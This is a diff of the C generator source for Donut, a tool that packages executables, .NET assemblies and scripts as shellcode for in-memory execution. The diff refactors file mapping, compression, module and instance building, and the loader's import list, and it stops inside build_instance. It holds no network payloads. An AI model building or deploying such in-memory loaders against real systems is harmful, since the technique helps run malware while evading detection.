@@ -31,8 +31,8 @@
 
 #include "donut.h"
 
-#include "loader/loader_exe_x86.h"
-#include "loader/loader_exe_x64.h"
+#include "loader_exe_x86.h"
+#include "loader_exe_x64.h"
   
 #define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
 #define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
@@ -40,11 +40,10 @@
 #define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
  
 // required for each API used by the loader
-#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32;dnsapi"
+#define DLL_NAMES "ole32;oleaut32;wininet;mscoree;shell32"
  
 // These must be in the same order as the DONUT_INSTANCE structure defined in donut.h
-static API_IMPORT api_imports[]=
-{ 
+static API_IMPORT api_imports[] = { 
   {KERNEL32_DLL, "LoadLibraryA"},
   {KERNEL32_DLL, "GetProcAddress"},
   {KERNEL32_DLL, "GetModuleHandleA"},
@@ -59,6 +58,8 @@ static API_IMPORT api_imports[]=
   {KERNEL32_DLL, "CreateThread"},
   {KERNEL32_DLL, "GetThreadContext"},
   {KERNEL32_DLL, "GetCurrentThread"},
+  {KERNEL32_DLL, "GetCommandLineA"},
+  {KERNEL32_DLL, "GetCommandLineW"},
       
   {SHELL32_DLL,  "CommandLineToArgvW"},
   
@@ -97,8 +98,10 @@ static API_IMPORT api_imports[]=
   {NTDLL_DLL,    "RtlExitUserProcess"},
   {NTDLL_DLL,    "RtlCreateUnicodeString"},
   {NTDLL_DLL,    "RtlGetCompressionWorkSpaceSize"},
-  {NTDLL_DLL,    "RtlDecompressBufferEx"},
+  {NTDLL_DLL,    "RtlDecompressBuffer"},
   {NTDLL_DLL,    "NtContinue"},
+  {KERNEL32_DLL, "AddVectoredExceptionHandler"},
+  {KERNEL32_DLL, "RemoveVectoredExceptionHandler"},
   //{NTDLL_DLL,    "RtlFreeUnicodeString"},
   //{NTDLL_DLL,    "RtlFreeString"},
   
@@ -155,12 +158,8 @@ static GUID xCLSID_VBScript = {
 static GUID xCLSID_JScript  = {
   0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};
 
-#if defined(_WIN32) | defined(_WIN64)
-#include "include/mmap-windows.c"
-#ifdef _MSC_VER
-#define strcasecmp stricmp
-#endif
-#endif
+// where to store information about input file
+file_info fi;
 
 // return pointer to DOS header
 static PIMAGE_DOS_HEADER DosHdr(void *map) {
@@ -231,62 +230,95 @@ static ULONG64 rva2ofs (void *base, ULONG64 rva) {
     return -1;
 }
 
-// map a file into memory for reading
-static int map_file(const char *path, file_info *fi) {
+#ifdef WINDOWS
+#include "mmap-windows.c"
+#endif
+
+/**
+ * Function: map_file
+ * ----------------------------
+ *   Open and map the contents of file into memory.
+ *   
+ *   INPUT  : path = file to map
+ *       
+ *   OUTPUT : Donut error code. 
+ */
+static int map_file(const char *path) {
     struct stat fs;
 
-    DPRINT("Reading size of file : %s", path);
+    DPRINT("Entering.");
+    
     if(stat(path, &fs) != 0) {
+      DPRINT("Unable to read size of file : %s", path);
       return DONUT_ERROR_FILE_NOT_FOUND;
     }
     
     if(fs.st_size == 0) {
+      DPRINT("File appears to be empty!");
       return DONUT_ERROR_FILE_EMPTY;
     }
-      
-    DPRINT("Opening %s", path);
-    fi->fd = open(path, O_RDONLY);
     
-    if(fi->fd < 0) {
+    fi.fd = open(path, O_RDONLY);
+    
+    if(fi.fd < 0) {
+      DPRINT("Unable to open %s for reading.", path);
       return DONUT_ERROR_FILE_ACCESS;
     }
     
-    fi->len = fs.st_size;
+    fi.len = fs.st_size;
     
-    // map into memory
-    DPRINT("Mapping %" PRIi32 " bytes for %s", fi->len, path);
-    fi->data = mmap(NULL, fi->len,  
-      PROT_READ, MAP_PRIVATE, fi->fd, 0);
+    fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);
     
     // no mapping? close file
-    if(fi->data == NULL) {
-      close(fi->fd);
-      fi->data = NULL;
+    if(fi.data == NULL) {
+      DPRINT("Unable to map file : %s", path);
+      close(fi.fd);
       return DONUT_ERROR_NO_MEMORY;
     }
     return DONUT_ERROR_SUCCESS;
 }
 
-// unmap a file from memory previously opened with map_file()
-static int unmap_file(file_info *fi) {
+/**
+ * Function: unmap_file
+ * ----------------------------
+ *   Releases memory allocated for file and closes descriptor.
+ *
+ *   INPUT  : Nothing
+ *
+ *   OUTPUT : Donut error code
+ */
+static int unmap_file(void) {
     
-    if(fi == NULL) return 0;
-    
-    if(fi->zdata != NULL) {
-      DPRINT("Releasing compressed data");
-      free(fi->zdata);
-      fi->zdata = NULL;
+    if(fi.zdata != NULL) {
+      DPRINT("Releasing compressed data.");
+      free(fi.zdata);
+      fi.zdata = NULL;
     }
-    DPRINT("Unmapping");
-    munmap(fi->data, fi->len);    
-    
-    DPRINT("Closing");
-    close(fi->fd);
-    
-    return 1;
+    if(fi.data != NULL) {
+      DPRINT("Unmapping input file.");
+      munmap(fi.data, fi.len);    
+      fi.data = NULL;
+    }
+    if(fi.fd != 0) {
+      DPRINT("Closing input file.");
+      close(fi.fd);
+      fi.fd = 0;
+    }
+    return DONUT_ERROR_SUCCESS;
 }
 
+// only included for executable generator or debug build
 #if defined(DONUT_EXE) || defined(DEBUG)
+/**
+ * Function: file_diff
+ * ----------------------------
+ *   Calculates the ratio between two lengths for compression and decompression.
+ *
+ *   INPUT  : new_len = new length
+ *          : old_len = old length
+ *
+ *   OUTPUT : ratio as a percentage
+ */
 static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
     if (new_len <= UINT_MAX / 100) {
       new_len *= 100;
@@ -300,7 +332,125 @@ static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
 }
 #endif
 
-static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
+/**
+ * Function: compress_file
+ * ----------------------------
+ *   Compresses the input file based on engine selected by user
+ *
+ *   INPUT  : Pointer to Donut configuration.
+ *
+ *   OUTPUT : Donut error code. 
+ */
+int compress_file(PDONUT_CONFIG c) {
+    int err = DONUT_ERROR_SUCCESS;
+    
+    // RtlCompressBuffer is only available on Windows
+    #ifdef WINDOWS
+    typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSize_t)(
+      USHORT                 CompressionFormatAndEngine,
+      PULONG                 CompressBufferWorkSpaceSize,
+      PULONG                 CompressFragmentWorkSpaceSize);
+
+    typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
+      USHORT                 CompressionFormatAndEngine,
+      PUCHAR                 UncompressedBuffer,
+      ULONG                  UncompressedBufferSize,
+      PUCHAR                 CompressedBuffer,
+      ULONG                  CompressedBufferSize,
+      ULONG                  UncompressedChunkSize,
+      PULONG                 FinalCompressedSize,
+      PVOID                  WorkSpace);
+    
+    ULONG                            wspace, fspace;
+    NTSTATUS                         nts;
+    PVOID                            ws;
+    HMODULE                          m;
+    RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
+    RtlCompressBuffer_t              RtlCompressBuffer;
+    
+    // compress file using RtlCompressBuffer?
+    if(c->compress == DONUT_COMPRESS_LZNT1  ||
+       c->compress == DONUT_COMPRESS_XPRESS ||
+       c->compress == DONUT_COMPRESS_XPRESS_HUFF) 
+    {
+      m = GetModuleHandle("ntdll");
+      RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, "RtlGetCompressionWorkSpaceSize");
+      RtlCompressBuffer              = (RtlCompressBuffer_t)GetProcAddress(m, "RtlCompressBuffer");
+      
+      if(RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL) {
+        DPRINT("Unable to resolve compression API");
+        return DONUT_ERROR_COMPRESSION;
+      }
+      
+      DPRINT("Reading fragment and workspace size");
+      nts = RtlGetCompressionWorkSpaceSize(
+        (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
+        &wspace, &fspace);
+        
+      if(nts == 0) {
+        DPRINT("workspace size : %"PRId32" | fragment size : %"PRId32, wspace, fspace);
+        ws = malloc(wspace); 
+        if(ws != NULL) {
+          DPRINT("Allocating memory for compressed data.");
+          fi.zdata = malloc(fi.len);
+          if(fi.zdata != NULL) {
+            DPRINT("Compressing %p to %p with RtlCompressBuffer(%s)",
+              fi.data, fi.zdata,
+              c->compress == DONUT_COMPRESS_LZNT1  ? "LZNT" : 
+              c->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
+            
+            nts = RtlCompressBuffer(
+              (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
+              fi.data, fi.len, fi.zdata, fi.len, 0, 
+              (PULONG)&fi.zlen, ws); 
+            
+            if(nts != 0) {
+              DPRINT("NTSTATUS : %lx", nts);
+              err = DONUT_ERROR_COMPRESSION;
+            }
+          } else err = DONUT_ERROR_NO_MEMORY;
+          free(ws);
+        } else err = DONUT_ERROR_NO_MEMORY;
+      } else err = DONUT_ERROR_COMPRESSION;
+    }
+    #endif
+    if(c->compress == DONUT_COMPRESS_APLIB) {
+      DPRINT("Obtaining size of compressed data from aP_max_packed_size() and allocating memory");
+      fi.zdata = malloc(aP_max_packed_size(fi.len));
+      if(fi.zdata != NULL) {
+        DPRINT("Obtaining size of work memory from aP_workmem_size() and allocating memory");
+        uint8_t *workmem = malloc(aP_workmem_size(fi.len));
+        if(workmem != NULL) {
+          DPRINT("Compressing with aP_pack()");
+          fi.zlen = aP_pack(fi.data, fi.zdata, fi.len, workmem, NULL, NULL);
+        
+          if(fi.zlen == APLIB_ERROR) err = DONUT_ERROR_COMPRESSION;
+          free(workmem);
+        } else err = DONUT_ERROR_NO_MEMORY;
+      } else err = DONUT_ERROR_NO_MEMORY;
+    }
+    
+    // if compression is specified
+    if(err == DONUT_ERROR_SUCCESS && c->compress != DONUT_COMPRESS_NONE) {
+      // set the compressed length in configuration
+      c->zlen = fi.zlen;
+      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, fi.len, fi.zlen);
+      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi.zlen, fi.len));
+    }
+    DPRINT("Leaving with error :  %" PRId32, err);
+    return err;
+}
+
+/**
+ * Function: read_file_info
+ * ----------------------------
+ *   Reads information about the input file.
+ *
+ *   INPUT  : Pointer to Donut configuration.
+ *
+ *   OUTPUT : Donut error code.
+ */
+static int read_file_info(PDONUT_CONFIG c) {
     PIMAGE_NT_HEADERS                nt;    
     PIMAGE_DATA_DIRECTORY            dir;
     PMDSTORAGESIGNATURE              pss;
@@ -313,106 +463,113 @@ static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
     DPRINT("Entering.");
     
     // invalid parameters passed?
-    if(fi == NULL || c->input[0] == 0) {
+    if(c->input[0] == 0) {
+      DPRINT("No input file provided.");
       return DONUT_ERROR_INVALID_PARAMETER;
     }
-    // zero initialize file_info structure
-    memset(fi, 0, sizeof(file_info));
-    
+
     DPRINT("Checking extension of %s", c->input);
     ext = strrchr(c->input, '.');
     
     // no extension? exit
     if(ext == NULL) {
+      DPRINT("Input file has no extension.");
       return DONUT_ERROR_FILE_INVALID;
     }
     DPRINT("Extension is \"%s\"", ext);
 
     // VBScript?
     if (strcasecmp(ext, ".vbs") == 0) {
-      DPRINT("Module is VBS");
-      fi->type = DONUT_MODULE_VBS;
-      fi->arch = DONUT_ARCH_ANY;
+      DPRINT("File is VBS");
+      fi.type = DONUT_MODULE_VBS;
+      fi.arch = DONUT_ARCH_ANY;
     } else 
     // JScript?
     if (strcasecmp(ext,  ".js") == 0) {
-      DPRINT("Module is JS");
-      fi->type = DONUT_MODULE_JS;
-      fi->arch = DONUT_ARCH_ANY;
+      DPRINT("File is JS");
+      fi.type = DONUT_MODULE_JS;
+      fi.arch = DONUT_ARCH_ANY;
     } else 
     // EXE?
     if (strcasecmp(ext, ".exe") == 0) {
-      DPRINT("Module is EXE");
-      fi->type = DONUT_MODULE_EXE;
+      DPRINT("File is EXE");
+      fi.type = DONUT_MODULE_EXE;
     } else
     // DLL?
     if (strcasecmp(ext, ".dll") == 0) {
-      DPRINT("Module is DLL");
-      fi->type = DONUT_MODULE_DLL;
+      DPRINT("File is DLL");
+      fi.type = DONUT_MODULE_DLL;
     } else {
-      // unrecognized extension
+      DPRINT("Don't recognize file extension.");
       return DONUT_ERROR_FILE_INVALID;
     }
     
     DPRINT("Mapping %s into memory", c->input);
     
-    err = map_file(c->input, fi);
+    err = map_file(c->input);
     if(err != DONUT_ERROR_SUCCESS) return err;
     
     // file is EXE or DLL?
-    if(fi->type == DONUT_MODULE_DLL ||
-       fi->type == DONUT_MODULE_EXE)
+    if(fi.type == DONUT_MODULE_DLL ||
+       fi.type == DONUT_MODULE_EXE)
     {
-      DPRINT("Checking DOS header");
-      
-      if(!valid_dos_hdr(fi->data)) {
+      if(!valid_dos_hdr(fi.data)) {
+        DPRINT("EXE/DLL has no valid DOS header.");
         err = DONUT_ERROR_FILE_INVALID;
         goto cleanup;
       }
-      DPRINT("Checking NT header");
       
-      if(!valid_nt_hdr(fi->data)) { 
+      if(!valid_nt_hdr(fi.data)) {
+        DPRINT("EXE/DLL has no valid NT header.");
         err = DONUT_ERROR_FILE_INVALID;
         goto cleanup;
       }
-      DPRINT("Checking IMAGE_DATA_DIRECTORY");
-      
-      dir = Dirs(fi->data);
+
+      dir = Dirs(fi.data);
       
       if(dir == NULL) {
+        DPRINT("EXE/DLL has no valid image directories.");
         err = DONUT_ERROR_FILE_INVALID;
         goto cleanup;
       }
       DPRINT("Checking characteristics");
       
-      nt  = NtHdr(fi->data);
+      nt  = NtHdr(fi.data);
       dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
-      cpu = is32(fi->data);
+      cpu = is32(fi.data);
       rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
       
       // set the CPU architecture for file
-      fi->arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
+      fi.arch = cpu ? DONUT_ARCH_X86 : DONUT_ARCH_X64;
       
       // if COM directory present
       if(rva != 0) {
-        DPRINT("COM Directory found");
+        DPRINT("COM Directory found indicates .NET assembly.");
         
-        // set type to EXE or DLL assembly
-        fi->type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
-        
-        // try read the runtime version from meta header
-        strncpy(fi->ver, "v4.0.30319", DONUT_VER_LEN - 1);
-        
-        ofs = rva2ofs(fi->data, rva);
-        if (ofs != -1) {
-          cor = (PIMAGE_COR20_HEADER)(ofs + fi->data);
-          rva = cor->MetaData.VirtualAddress;
-          if(rva != 0) {
-            ofs = rva2ofs(fi->data, rva);
-            if(ofs != -1) {
-              pss = (PMDSTORAGESIGNATURE)(ofs + fi->data);
-              DPRINT("Runtime version : %s", (char*)pss->pVersion);
-              strncpy(fi->ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
+        // if it has an export address table, we assume it's a .NET
+        // mixed assembly. curently unsupported by the PE loader.
+        if(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
+          DPRINT("File looks like a mixed (native and managed) assembly.");
+          err = DONUT_ERROR_MIXED_ASSEMBLY;
+          goto cleanup;
+        } else {
+          // set type to EXE or DLL assembly
+          fi.type = (dll) ? DONUT_MODULE_NET_DLL : DONUT_MODULE_NET_EXE;
+          
+          // try read the runtime version from meta header
+          strncpy(fi.ver, "v4.0.30319", DONUT_VER_LEN - 1);
+          
+          ofs = rva2ofs(fi.data, rva);
+          if (ofs != -1) {
+            cor = (PIMAGE_COR20_HEADER)(ofs + fi.data);
+            rva = cor->MetaData.VirtualAddress;
+            if(rva != 0) {
+              ofs = rva2ofs(fi.data, rva);
+              if(ofs != -1) {
+                pss = (PMDSTORAGESIGNATURE)(ofs + fi.data);
+                DPRINT("Runtime version : %s", (char*)pss->pVersion);
+                strncpy(fi.ver, (char*)pss->pVersion, DONUT_VER_LEN - 1);
+              }
             }
           }
         }
@@ -420,160 +577,35 @@ static int get_file_info(PDONUT_CONFIG c, file_info *fi) {
         // we need relocation information for unmanaged EXE / DLL
         rva = dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
         if(rva == 0) {
+          DPRINT("EXE/DLL has no relocation information.");
           err = DONUT_ERROR_NORELOC;
           goto cleanup;
         }
       }
     }
-    #ifdef WINDOWS
-      typedef NTSTATUS (WINAPI *RtlGetCompressionWorkSpaceSize_t)(
-        USHORT                 CompressionFormatAndEngine,
-        PULONG                 CompressBufferWorkSpaceSize,
-        PULONG                 CompressFragmentWorkSpaceSize);
-
-      typedef NTSTATUS (WINAPI *RtlCompressBuffer_t)(
-        USHORT                 CompressionFormatAndEngine,
-        PUCHAR                 UncompressedBuffer,
-        ULONG                  UncompressedBufferSize,
-        PUCHAR                 CompressedBuffer,
-        ULONG                  CompressedBufferSize,
-        ULONG                  UncompressedChunkSize,
-        PULONG                 FinalCompressedSize,
-        PVOID                  WorkSpace);
-      
-      ULONG                            wspace, fspace;
-      NTSTATUS                         nts;
-      PVOID                            ws;
-      HMODULE                          m;
-      RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
-      RtlCompressBuffer_t              RtlCompressBuffer;
-      
-      // compress file using RtlCompressBuffer?
-      if(c->compress == DONUT_COMPRESS_LZNT1  ||
-         c->compress == DONUT_COMPRESS_XPRESS ||
-         c->compress == DONUT_COMPRESS_XPRESS_HUFF) 
-      {
-        m = GetModuleHandle("ntdll");
-        RtlGetCompressionWorkSpaceSize = (RtlGetCompressionWorkSpaceSize_t)GetProcAddress(m, "RtlGetCompressionWorkSpaceSize");
-        RtlCompressBuffer              = (RtlCompressBuffer_t)GetProcAddress(m, "RtlCompressBuffer");
-        
-        if(RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL) {
-          DPRINT("Unable to resolve compression API");
-          err = DONUT_ERROR_COMPRESSION;
-          goto cleanup;
-        }
-        
-        DPRINT("Reading fragment and workspace size");
-        nts = RtlGetCompressionWorkSpaceSize(
-          (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
-          &wspace, &fspace);
-          
-        if(nts == 0) {
-          DPRINT("workspace size : %"PRId32" | fragment size : %"PRId32, wspace, fspace);
-          ws = malloc(wspace); 
-          if(ws != NULL) {
-            DPRINT("Allocating memory for compressed file");
-            fi->zdata = malloc(fi->len);
-            if(fi->zdata != NULL) {
-              DPRINT("Compressing with RtlCompressBuffer(%s)",
-                c->compress == DONUT_COMPRESS_LZNT1 ? "LZNT" : 
-                c->compress == DONUT_COMPRESS_XPRESS ? "XPRESS" : "XPRESS HUFFMAN");
-              
-              nts = RtlCompressBuffer(
-                (c->compress - 1) | COMPRESSION_ENGINE_MAXIMUM, 
-                fi->data, fi->len, fi->zdata, fi->len, 0, 
-                (PULONG)&fi->zlen, ws); 
-              
-              c->zlen = fi->zlen;
-              c->len  = fi->len;
-              
-              if(nts != 0) err = DONUT_ERROR_COMPRESSION;
-            } else err = DONUT_ERROR_NO_MEMORY;
-            free(ws);
-            goto show_stats;
-          } else err = DONUT_ERROR_NO_MEMORY;
-        } else err = DONUT_ERROR_COMPRESSION;
-      }
-    #endif
-    if(c->compress == DONUT_COMPRESS_APLIB) {
-      fi->zdata = malloc(aP_max_packed_size(fi->len));
-      if(fi->zdata != NULL) {
-        uint8_t *workmem = malloc(aP_workmem_size(fi->len));
-        if(workmem != NULL) {
-          DPRINT("Compressing with aPLib");
-          c->len  = fi->len;
-          c->zlen = fi->zlen = aP_pack(fi->data, fi->zdata, fi->len, workmem, NULL, NULL);
-        
-          if(fi->zlen == APLIB_ERROR) err = DONUT_ERROR_COMPRESSION;
-          free(workmem);
-        } else err = DONUT_ERROR_NO_MEMORY;
-      } else err = DONUT_ERROR_NO_MEMORY;
-    }
-    
-#ifdef WINDOWS
-show_stats:
-#endif
-    // if compression was specified
-    if(c->compress != DONUT_COMPRESS_NONE) {
-      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, 
-        fi->len, fi->zlen);
-      
-      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi->zlen, fi->len));
-    }
+    // assign length of file and type to configuration
+    c->len      = fi.len;
+    c->mod_type = fi.type;
 cleanup:
     if(err != DONUT_ERROR_SUCCESS) {
-      unmap_file(fi);
+      DPRINT("Unmapping input file due to errors.");
+      unmap_file();
     }
-    DPRINT("Leaving.");
+    DPRINT("Leaving with error :  %" PRId32, err);
     return err;
 }
 
-// check if DLL exports function name
-static int is_dll_export(file_info *fi, const char *function) {
-    PIMAGE_DATA_DIRECTORY   dir;
-    PIMAGE_EXPORT_DIRECTORY exp;
-    DWORD                   rva, cnt;
-    ULONG64                 ofs;
-    PDWORD                  sym;
-    PCHAR                   str;
-    int                     found = 0;
-
-    DPRINT("Entering.");
-    
-    dir = Dirs(fi->data);
-    if(dir != NULL) {
-      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-      DPRINT("EAT VA : %lx", rva);
-      if(rva != 0) {
-        ofs = rva2ofs(fi->data, rva);
-        DPRINT("Offset = %" PRIX64 "\n", ofs);
-        if(ofs != -1) {
-          exp = (PIMAGE_EXPORT_DIRECTORY)(fi->data + ofs);
-          cnt = exp->NumberOfNames;
-          DPRINT("Number of exported functions : %lx", cnt);
-          
-          if(cnt != 0) {
-            sym = (PDWORD)(rva2ofs(fi->data, exp->AddressOfNames) + fi->data);
-            // scan array for symbol
-            do {
-              str = (PCHAR)(rva2ofs(fi->data, sym[cnt - 1]) + fi->data);
-              // if match found, exit
-              if(strcmp(str, function) == 0) {
-                DPRINT("Found API");
-                found = 1;
-                break;
-              }
-            } while (--cnt);
-          }
-        }
-      }
-    }
-    DPRINT("Leaving.");
-    return found;
-}
-
-// returns 1 on success else <=0
-static int CreateRandom(void *buf, uint64_t len) {
+/**
+ * Function: gen_random
+ * ----------------------------
+ *   Generates pseudo-random bytes.
+ *
+ *   INPUT  : buf = where to store random bytes.
+ *          : len = length of random bytes to generate.
+ *
+ *   OUTPUT : 1 if ok, else 0
+ */
+static int gen_random(void *buf, uint64_t len) {
 #if defined(WINDOWS)
     HCRYPTPROV prov;
     int        ok;
@@ -581,7 +613,7 @@ static int CreateRandom(void *buf, uint64_t len) {
     // 1. acquire crypto context
     if(!CryptAcquireContext(
         &prov, NULL, NULL,
-        PROV_RSA_AES,
+        PROV_RSA_FULL,
         CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) return 0;
 
     ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
@@ -607,18 +639,26 @@ static int CreateRandom(void *buf, uint64_t len) {
 #endif
 }
 
-// Generate a random string, not exceeding DONUT_MAX_NAME bytes
-// tbl is from https://stackoverflow.com/a/27459196
-static int GenRandomString(void *output, uint64_t len) {
+/**
+ * Function: gen_random_string
+ * ----------------------------
+ *   Generates a pseudo-random string
+ *
+ *   INPUT  : output = pointer to buffer that receives string
+ *          : len = length of string to generate
+ *
+ *   OUTPUT : 1 if ok, else 0  
+ */
+static int gen_random_string(void *output, uint64_t len) {
     uint8_t rnd[DONUT_MAX_NAME];
     int     i;
-    char    tbl[]="HMN34P67R9TWCXYF"; 
+    char    tbl[]="HMN34P67R9TWCXYF";  // https://stackoverflow.com/a/27459196
     char    *str = (char*)output;
     
     if(len == 0 || len > (DONUT_MAX_NAME - 1)) return 0;
     
     // generate DONUT_MAX_NAME random bytes
-    if(!CreateRandom(rnd, DONUT_MAX_NAME)) return 0;
+    if(!gen_random(rnd, DONUT_MAX_NAME)) return 0;
     
     // generate a string using unambiguous characters
     for(i=0; i<len; i++) {
@@ -628,18 +668,41 @@ static int GenRandomString(void *output, uint64_t len) {
     return 1;
 }
 
-static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
+/**
+ * Function: build_module
+ * ----------------------------
+ *   Create a Donut module from Donut configuration
+ *
+ *   INPUT  : A pointer to a donut configuration
+ *
+ *   OUTPUT : Donut error code. 
+ */
+static int build_module(PDONUT_CONFIG c) {
     PDONUT_MODULE mod     = NULL;
-    uint32_t      mod_len = 0, data_len;
-    void          *data   = NULL;
-    int           err     = DONUT_ERROR_SUCCESS;
+    uint32_t      mod_len, data_len;
+    void          *data;
+    int           err = DONUT_ERROR_SUCCESS;
     
     DPRINT("Entering.");
     
+    // Compress the input file?
+    if(c->compress != DONUT_COMPRESS_NONE) {
+      err = compress_file(c);
+      
+      if(err != DONUT_ERROR_SUCCESS) {
+        DPRINT("compress_file() failed");
+        return err;
+      }
+      DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.zlen, fi.zdata);
+      data     = fi.zdata;
+      data_len = fi.zlen;
+    } else {
+      DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.len, fi.data);
+      data     = fi.data;
+      data_len = fi.len;
+    }
     // Allocate memory for module information and contents of file
-    data     = (c->compress == DONUT_COMPRESS_NONE) ? fi->data : fi->zdata;
-    data_len = (c->compress == DONUT_COMPRESS_NONE) ? fi->len  : fi->zlen;
-    mod_len  = data_len + sizeof(DONUT_MODULE);
+    mod_len = data_len + sizeof(DONUT_MODULE);
     
     DPRINT("Allocating %" PRIi32 " bytes of memory for DONUT_MODULE", mod_len);
     mod = calloc(mod_len, 1);
@@ -650,31 +713,34 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
       return DONUT_ERROR_NO_MEMORY;
     }
     
-    // Set the type of module
-    mod->type     = fi->type;
+    // Set the module info
+    mod->type     = fi.type;
     mod->thread   = c->thread;
-    mod->unicode  = c->unicode;
     mod->compress = c->compress;
+    mod->unicode  = c->unicode;
+    mod->zlen     = fi.zlen;
+    mod->len      = fi.len;
     
     // DotNet assembly?
     if(mod->type == DONUT_MODULE_NET_DLL ||
        mod->type == DONUT_MODULE_NET_EXE)
     {
-      // If no domain name specified
-      if(c->domain[0] == 0) {
-        // If entropy enabled
-        if(c->entropy != DONUT_ENTROPY_NONE) {
-          // Generate random name
-          if(!GenRandomString(c->domain, DONUT_DOMAIN_LEN)) {
+      // If no domain name specified in configuration
+      if(c->domain[0] == 0) { 
+        // If entropy is disabled
+        if(c->entropy == DONUT_ENTROPY_NONE) {
+          // Set to "AAAAAAAA"
+          memset(c->domain, 'A', DONUT_DOMAIN_LEN);
+        } else {
+          // Else, generate a random name
+          if(!gen_random_string(c->domain, DONUT_DOMAIN_LEN)) {
+            DPRINT("gen_random_string() failed");
             err = DONUT_ERROR_RANDOM;
             goto cleanup;
-          }
-        } else {
-          // set to "AAAAAAAA"
-          memset(c->domain, 'A', DONUT_DOMAIN_LEN);
+          } 
         }
       }
-      // Set the domain name to use
+      // Set the domain name to use in module
       DPRINT("Domain  : %s", c->domain);
       strncpy(mod->domain, c->domain, DONUT_DOMAIN_LEN);
       
@@ -688,12 +754,12 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
       }
       // If no runtime specified in configuration, use version from assembly
       if(c->runtime[0] == 0) {
-        strncpy(c->runtime, fi->ver, DONUT_MAX_NAME-1);
+        strncpy(c->runtime, fi.ver, DONUT_MAX_NAME-1);
       }
       DPRINT("Runtime : %s", c->runtime);
       strncpy(mod->runtime, c->runtime, DONUT_MAX_NAME-1);
     } else
-    // Unmanaged DLL? check for exported api          
+    // Unmanaged DLL? copy function name to module          
     if(mod->type == DONUT_MODULE_DLL && c->method[0] != 0) {
       DPRINT("DLL function : %s", c->method);
       strncpy(mod->method, c->method, DONUT_MAX_NAME-1);
@@ -701,27 +767,28 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
       
     // Parameters specified?
     if(c->param[0] != 0) {
-      // if type is unmanaged EXE
+      // If file type is unmanaged EXE
       if(mod->type == DONUT_MODULE_EXE) {
-        // and entropy is enabled
-        if(c->entropy != DONUT_ENTROPY_NONE) {
-          // generate 4-byte random name
-          GenRandomString(mod->param, 4);
-          mod->param[4] = ' ';
-        } else {
-          // else set to "AAAA "
+        // If entropy is disabled
+        if(c->entropy == DONUT_ENTROPY_NONE) {
+          // Set to "AAAA"
           memset(mod->param, 'A', 4);
-          mod->param[4] = ' ';
+        } else {
+          // Generate 4-byte random name
+          if(!gen_random_string(mod->param, 4)) {
+            DPRINT("gen_random_string() failed");
+            err = DONUT_ERROR_RANDOM;
+            goto cleanup;
+          }
         }
+        // Add space
+        mod->param[4] = ' ';
       }
+      // 
+      // Copy parameters 
       strncat(mod->param, c->param, DONUT_MAX_NAME-6);
-    }
-    
-    DPRINT("Setting the length of module data");
-    
-    mod->len  = fi->len;
-    mod->zlen = fi->zlen;
-    DPRINT("Copying data");
+    }    
+    DPRINT("Copying data to module");
     
     memcpy(&mod->data, data, data_len);
     // update configuration with pointer to module
@@ -729,26 +796,34 @@ static int CreateModule(PDONUT_CONFIG c, file_info *fi) {
     c->mod_len = mod_len;
 cleanup:
     // if there was an error, free memory for module
-    if(err != DONUT_ERROR_SUCCESS && mod != NULL) {
+    if(err != DONUT_ERROR_SUCCESS) {
+      DPRINT("Releasing memory due to errors.");
       free(mod);
-      c->mod     = NULL;
-      c->mod_len = 0;
     }
-    DPRINT("Leaving.");
+    DPRINT("Leaving with error :  %" PRId32, err);
     return err;
 }
 
-static int CreateInstance(PDONUT_CONFIG c, file_info *fi) {
+/**
+ * Function: build_instance
+ * ----------------------------
+ *   Creates the data necessary for main loader to execute VBS/JS/EXE/DLL files in memory.
+ *
+ *   INPUT  : Pointer to a Donut configuration.
+ *
+ *   OUTPUT : Donut error code. 
+ */
+static int build_instance(PDONUT_CONFIG c) {
     DONUT_CRYPT     inst_key, mod_key;
     PDONUT_INSTANCE inst = NULL;
-    int             inst_len = 0;
